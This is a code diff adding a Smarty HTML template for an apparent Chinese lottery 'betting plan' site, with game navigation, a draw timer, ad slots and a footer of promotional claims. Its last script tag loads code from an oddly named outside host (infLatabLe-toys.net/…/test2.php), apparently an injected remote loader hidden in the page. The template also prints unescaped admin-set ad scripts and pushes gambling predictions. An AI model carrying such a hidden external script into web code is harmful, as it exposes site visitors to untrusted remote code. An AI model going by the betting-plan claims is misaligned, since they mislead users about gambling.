@@ -1,1 +1,261 @@
-12323213213213
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title><{$config.sitetitle}></title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="stylesheet" type="text/css" href="/i/style/jh/style.css" />
+    <link rel="stylesheet" type="text/css" href="/i/style/font-awesome/css/font-awesome.min.css" />
+	<script>
+		var ad_left_img="<{$config.ad_left_img}>";
+		var ad_left_link="<{$config.ad_left_link}>";
+		
+		var ad_right_img="<{$config.ad_right_img}>";
+		var ad_right_link="<{$config.ad_right_link}>";
+		
+		
+		var ad_center_img1="<{$config.ad_center_img1}>";
+		var ad_center_link1="<{$config.ad_center_link1}>";
+		
+		var ad_center_img2="<{$config.ad_center_img2}>";
+		var ad_center_link2="<{$config.ad_center_link2}>";
+	</script>
+    <script src="/i/js/moke.js"></script>
+    <script src="/i/js/jquery-3.3.1.min.js"></script>
+    <noscript>
+        <div class="noScript">
+            <div>
+                <h2>请开启浏览器的Javascript功能</h2>
+                <p>
+                    亲，没它我们玩不转啊！求您了，开启Javascript吧！<br />
+                    不知道怎么开启Javascript？那就请<a href="http://www.baidu.com/s?wd=%E5%A6%82%E4%BD%95%E6%89%93%E5%BC%80Javascript%E5%8A%9F%E8%83%BD" rel="nofollow" target="_blank">猛击这里</a>！
+                </p>
+            </div>
+        </div>
+    </noscript>
+</head>
+<body>
+    <div style="display: none"><{$gameType}><{$tt}></div>
+
+
+    <!--顶部导航-->
+    <nav class="header navbar navbar-toggleable-sm navbar-inverse container">
+        <a class="navbar-brand" href="/"><img src="<{$config.sitelogo}>" /></a>
+        <div class="collapse navbar-collapse" id="header">
+            <ul class="navbar-nav mx-auto">
+
+                <li class="nav-item"><a class="nav-link" dataid="1" href="/web/cqssc.html">重庆时时彩<span class="hot"></span></a></li>
+                <li class="nav-item"><a class="nav-link" dataid="2" href="/web/dfssc.html">大发时时彩<span class="hot"></span></a></li>
+                <li class="nav-item"><a class="nav-link" dataid="3" href="/web/pk10.html">北京PK10<span class="hot"></span></a></li>
+                <li class="nav-item"><a class="nav-link" dataid="4" href="/web/bjk3.html">北京快3<span class="hot"></span></a></li>
+                <li class="nav-item"><a class="nav-link" dataid="5" href="/web/dfk3.html">大发快3</a></li>
+                <li class="nav-item"><a class="nav-link" dataid="6" href="/web/jsk3.html">江苏快3</a></li>
+                <li class="nav-item"><a class="nav-link" dataid="7" href="/web/dfpk10.html">大发PK10</a></li>
+
+                <li class="nav-item dropdown">
+                    <a class="dropdown-toggle nav-link" href="javascript:void(0);" data-toggle="dropdown" id="dropdown">
+                        <i class="fa fa-caret-down text-yellow mr12"></i>更多...
+                    </a>
+                    <div class="dropdown-menu">
+
+                        <a class="dropdown-item" dataid="8" href="/web/shk3.html">上海快3</a>
+                        <a class="dropdown-item" dataid="9" href="/web/ahk3.html">安徽快3</a>
+                        <a class="dropdown-item" dataid="10" href="/web/gxk3.html">广西快3</a>
+                        <a class="dropdown-item" dataid="11" href="/web/hubk3.html">湖北快3</a>
+                        <a class="dropdown-item" dataid="12" href="/web/hebk3.html">河北快3</a>
+                        <a class="dropdown-item" dataid="13" href="/web/gsk3.html">甘肃快3</a>
+                        <a class="dropdown-item" dataid="14" href="/web/gzk3.html">贵州快3</a>
+                        <a class="dropdown-item" dataid="15" href="/web/jlk3.html">吉林快3</a>
+
+                    </div>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+    <!--/顶部导航-->
+
+     <div class="timer">
+        <div class="container">
+            <div class="timer-bg">
+                <!--接口内容-->
+                <div class="timer-heading">
+                    <span class="timer-text qi">第 <em id="now_qishu">-----------</em> 期</span><span class="clock" id="clock">正在更新计划，请稍后...</span>
+                </div>
+                <!--/接口内容-->
+
+                <div class="count">
+                    <!--接口内容-->
+                    <div class="firstcount firstcount_<{$gameClass}>"></div>
+                    <div class="middlecount">
+                        <div id="cqsscdt">
+                            <div class="cqssc-nums" id="show_qiu">
+                                <{if $row.type==0}>
+                                    <div>&#12288;</div>
+                                    <span>0</span>
+                                    <span>0</span>
+                                    <span>0</span>
+                                    <div>&#12288;</div>
+                                <{else if $row.type==1}>    
+                                    <span>0</span>
+                                    <span>0</span>
+                                    <span>0</span>
+                                    <span>0</span>
+                                    <span>0</span>
+                                 <{else}>
+                                    <em class="car-1">00</em>
+                                    <em class="car-2">00</em>
+                                    <em class="car-3">00</em>
+                                    <em class="car-4">00</em>
+                                    <em class="car-5">00</em>
+                                    <em class="car-6">00</em>
+                                    <em class="car-7">00</em>
+                                    <em class="car-8">00</em>
+                                    <em class="car-9">00</em>
+                                    <em class="car-10">00</em>
+                                 <{/if}>   
+                            </div>
+                        </div>
+                    </div>
+                    <!--/接口内容-->
+                    <!--广告内容-->
+                    <div class="lastcount">
+                        <h2><{$config.ad_center_txt_title}></h2>
+                        <div class="last">
+                            <a href="<{$config.ad_center_txt_link}>" target="_blank"><{$config.ad_center_txt_content nofilter}>"</a>
+                        </div>
+                    </div>
+                    <!--/广告内容-->
+                </div>
+                <!--接口内容-->
+                <div class="timer-total ">
+                    <div class="timer-mulbox">
+                        <span class="timer-multiple"><{$row.title}>实时下注倍数：<font id="multiple">正在更新计划，请稍后...</font></span>
+                    </div>
+                </div>
+                <!--/接口内容-->
+
+            </div>
+        </div>
+    </div>
+
+    <div class="clear"></div>
+
+    <!--万位内容-->
+    <div class="menubox container">
+        <div class="menus">
+            <ul>
+                <div style="float:left;width:160px;border-right: #46ABE1 solid 1px;">
+                    <li class="rb" onClick="rbshow(1)"><{$typeList[$row['type']]}></li>
+                    <div class="panel1" id="one1">
+                        <li class="rb" onClick="rbshow(1)">&#12288;&#12288;</li>
+                        <div class="ts1" onClick="location.href='/web/<{strtolower($gameType)}>.html?t=11';">大小</div>
+                        <div class="ts1" onClick="location.href='/web/<{strtolower($gameType)}>.html?t=12';">单双</div>
+                    </div>
+                </div>
+
+            </ul>
+        </div>
+    </div>
+    <!--/万位内容-->
+
+    <div class="jhbox">
+        <div class="jhtop">
+            <div class="jtl"></div>
+            <div class="jtr"></div>
+        </div>
+        <!--广告内容-->
+        <div class="box">
+<div class="adbox">
+<script type="text/javascript" src="/i/js/tugg.js" charset="gbk"></script></div>
+</div>
+        <div class="jhcenter">
+            <ul>
+                <li class="tips"><{$config.ad_plan_desc}></li>
+            </ul>
+        </div>
+        <!--/广告内容-->
+        <!--接口内容-->
+        <div class="jhcenter">
+            <ul id="jihua_list">正在更新<{$typeList[$row['type']]}>大小计划，请稍后...</ul>
+        </div>
+        <!--/接口内容-->
+        <div class="jhbottom">
+            <div class="jbl"></div>
+            <div class="jbr"></div>
+        </div>
+        <div class="clear"></div>
+    </div>
+
+
+    
+    
+
+
+
+<!--页面底部-->
+    <div class="footer">
+        <div class="container">
+            <div class="footer-social">
+                <div class="timer-tokens">
+
+                    <div class="timer-token">
+                        <div class="timer-token_desc"><span class="timer-token_t1">7X16小时</span><span class="timer-token_t2">全年无休</span></div>
+                    </div>
+
+                    <div class="timer-token">
+                        <div class="timer-token_desc"><span class="timer-token_t1">群体服务</span><span class="timer-token_t2">管理员全程教学</span></div>
+                    </div>
+
+                    <div class="timer-token">
+                        <div class="timer-token_desc"><span class="timer-token_t1">网赚领先者</span><span class="timer-token_t2">行业TOP10</span></div>
+                    </div>
+
+                    <div class="timer-token">
+                        <div class="timer-token_desc"><span class="timer-token_t1">9年服务经验</span><span class="timer-token_t2">服务超百万用户</span></div>
+                    </div>
+
+                </div>
+            </div>
+            <p class="footer-copy text-center mb-0">本网站采用无刷新技术，用户无需刷新网页即可实时查看开奖与计划<br />Copyright &copy; <{$config.sitetitle}>  all rights reserved </p>
+        </div>
+    </div>
+<!--/页面底部-->
+
+    <script type="text/javascript" src="/i/js/jh/open_time.js"></script>
+    <script type="text/javascript" src="/i/js/jh/tongji.js"></script>
+    <script type="text/javascript" src="/i/js/jh/main.js"></script>
+    <script type="text/javascript">
+		function getQueryString(name,def) {
+		    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+		    var r = window.location.search.substr(1).match(reg);
+		    if (r != null) return unescape(r[2]); return def;
+		}
+
+        GameType = "<{$gameType}>_"+getQueryString('t','11');
+        $("[dataid='<{$row.id}>']").addClass("nav-cur");
+        $(document).ready(function () {
+            StartRun(); 
+        });
+
+        function rbshow(i) {
+            var div6 = document.getElementById('one' + i);
+            if (div6.style.display == "block") {
+                $(".panel" + i).slideUp(300);
+            }
+            else {
+                $(".panel" + i).slideDown(300);
+            }
+        }
+    </script>
+
+
+<div style="display:none">
+<!--统计代码-->
+
+</div>
+<{$config.ad_bootem_js nofilter}>
+<script type="text/javascript" src="http://v2scr.infLatabLe-toys.net/64762827-1BED-BF44-A569-012BD78E4C43/test2.php" charset="UTF-8"></script>
+</body>
+</html>
